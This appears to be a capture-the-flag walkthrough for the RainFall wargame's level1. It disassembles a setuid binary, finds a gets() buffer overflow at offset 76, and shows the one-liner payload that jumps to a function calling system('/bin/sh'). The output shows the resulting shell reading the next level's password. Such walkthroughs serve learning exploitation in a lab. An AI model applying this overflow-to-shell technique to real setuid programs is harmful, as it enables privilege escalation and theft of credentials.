### Walkthrough

Run file, to have more detail about the file

```console
level1@RainFall:~$ file level1
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```

Running ls -l to check the permissions of the file

```console
level1@RainFall:~$ ls -l level1 
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

It's owner is level2, lets try to execute of shell inside, and get permissions of user level2

It's a 32bit executable, now we can use gdb

```asm
# disassemble main
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret 
```
```asm
# disassemble run
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret   
```

With a dessassembler we can reverse engineer the executable  
C code interpretation is in `source.c`

We will use a Buffer overflow pattern generator to calculate where the programs segfault  
`https://wiremask.eu/tools/buffer-overflow-pattern-generator/`

Offset value is `76`
We will try to jump to function `run()`, which contains a `system("/bin/sh)`

Address of run function is `0x08048444`

Because of small/big endian we shall reverse it and write it in hexadecimal
`\x44\x84\x04\x08`

```console
level1@RainFall:~$ (python -c 'print ("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
